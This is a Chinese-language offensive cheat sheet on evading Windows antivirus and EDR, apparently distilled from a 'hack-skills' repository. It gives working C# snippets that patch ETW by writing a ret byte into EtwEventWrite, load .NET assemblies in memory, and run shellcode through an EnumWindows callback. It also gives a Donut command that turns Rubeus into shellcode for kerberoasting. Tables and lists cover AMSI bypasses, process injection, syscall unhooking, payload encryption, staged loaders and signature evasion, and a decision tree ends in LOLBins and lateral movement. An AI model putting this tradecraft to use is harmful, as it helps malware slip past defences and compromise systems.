# Windows AV/EDR 规避

> 来源提炼: yaklang/hack-skills (windows-av-evasion)
> 覆盖 AMSI/ETW 绕过、.NET 内存加载、shellcode 执行、进程注入、unhooking、载荷加密、签名规避

## AMSI 绕过

| 类别 | 方法 | 检测风险 |
|------|------|---------|
| 内存修补 | patch `amsi.dll` 的 `AmsiScanBuffer` | 中 |
| 反射 | .NET 反射改 AMSI init flags | 中 |
| 字符串混淆 | 编码/拆分 AMSI 触发串 | 低 |
| PS 降级 | `powershell -Version 2`(无 AMSI) | 低 |
| CLM 绕过 | 逃逸约束语言模式 | 中 |
| COM 劫持 | 重定向 AMSI COM server | 低 |

## ETW 绕过

```csharp
var ntdll = GetModuleHandle("ntdll.dll");
var etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
VirtualProtect(etwAddr, 1, 0x40, out uint old);
Marshal.WriteByte(etwAddr, 0xC3);  // ret
```

## .NET 内存加载

```csharp
byte[] b = File.ReadAllBytes("tool.exe");
Assembly a = Assembly.Load(b);
a.EntryPoint.Invoke(null, new object[] { args });
```

```bash
# Donut: .NET EXE → shellcode
donut -f Rubeus.exe -o rubeus.bin -a 2 -p "kerberoast /outfile:tgs.txt"
```

## Shellcode 执行 (回调 API 代替 CreateThread)

```csharp
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
Marshal.Copy(sc, 0, addr, sc.Length);
EnumWindows(addr, IntPtr.Zero);  // 回调执行
```

回调 API: `EnumWindows` / `EnumChildWindows` / `EnumFonts` / `EnumDesktops` / `CertEnumSystemStore` / `EnumDateFormats`。

## 进程注入

| 技术 | API | 检测风险 |
|------|-----|---------|
| CreateRemoteThread | OpenProcess/VirtualAllocEx/WPM/CRT | 高 |
| NtMapViewOfSection | NtCreateSection/NtMapViewOfSection | 中 |
| Process Hollowing | CreateProcess(SUSPENDED)/NtUnmapViewOfSection | 中 |
| Thread Hijacking | SuspendThread/SetThreadContext | 中 |
| Early Bird | CreateProcess+QueueUserAPC | 低-中 |
| Phantom DLL / Module Stomping | 覆盖合法 DLL .text | 低 |

## Unhooking (绕过 EDR API hook)

- 直接 syscall: SysWhispers2/3(编译期 stub)、HellsGate(运行时解析)、HalosGate(邻近未 hook 解析)、TartarusGate。
- 新鲜 ntdll: 从磁盘/KnownDlls/挂起进程读干净 ntdll，覆盖被 hook 的 `.text`。
- 间接 syscall: 跳到 ntdll 内 syscall 指令(返回地址指向 ntdll，不指向自己代码)。

## 载荷加密与混淆

```csharp
// AES / XOR / RC4 加密 shellcode，执行时解密
// sleep 混淆: Ekko(ROP 加密堆栈) / Foliage(APC) / DeathSleep(线程注销)
```

分阶段加载: 阶段1小加密 loader → 阶段2运行时下载加密 payload → 阶段3内存解密执行。

## 签名规避

- 字符串加密: 避免明文 API 名/URL/工具名。
- API hashing: 按 hash 解析而非名称。
- 元数据移除: ConfuserEx/.NET Reactor/Obfuscar、改编译时间戳、删 PDB 路径、删 rich header。

## 决策树

```
PowerShell? → AMSI 绕过 → ETW 绕过 → CLM 绕过或转 C#
.NET 程序集? → 内存 Assembly.Load / Donut 转 shellcode / C2 execute-assembly / BOF
shellcode? → VirtualAlloc+回调 → 注入(按 OPSEC 选) → 内存扫描则加密+sleep 混淆
EDR hook ntdll? → 直接 syscall / 新鲜 ntdll / 间接 syscall
签名检测? → 字符串加密 / API hash / 元数据移除 / 改执行流
全失败 → LOLBins(certutil/mshta/regsvr32) / PsExec/WMI/WinRM / 无文件内存
```